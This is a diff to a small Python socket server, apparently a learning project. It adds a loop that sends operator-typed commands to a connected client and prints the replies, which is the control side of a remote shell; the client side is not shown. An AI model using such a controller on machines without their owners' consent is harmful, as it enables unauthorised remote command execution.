@@ -1,4 +1,5 @@
 import socket
+import sys
 import threading
 
 HEADER = 64  # bytes
@@ -12,6 +13,25 @@ ADDR = (SERVER, PORT)
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
+
+
+def send_command_to_client(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            server.close()
+            sys.exit()  # CLose command prompt
+
+        if len(cmd.encode(FORMAT)) > 0:    # send valid string
+            conn.send(cmd.encode(FORMAT))
+
+            client_response = str(conn.recv(1024), "utf-8")
+            print(f"[CLIENT RESPONSE] {client_response}", end="")
+
+
+def access_client_computer(conn, addr):
+    send_command_to_client(conn)
 
 
 def handle_client(conn, addr):
@@ -28,6 +48,7 @@ def handle_client(conn, addr):
             if message == DISCONNECT_MESSAGE:
                 connected = False
             print(f"[{addr}] : {message}")
+
             conn.send("Message recieved".encode(FORMAT))
 
     conn.close()
@@ -47,4 +68,5 @@ def start():
 
 print("[STARTING] server is starting...")
 
-start()
+if __name__ == "__main__":
+    start()
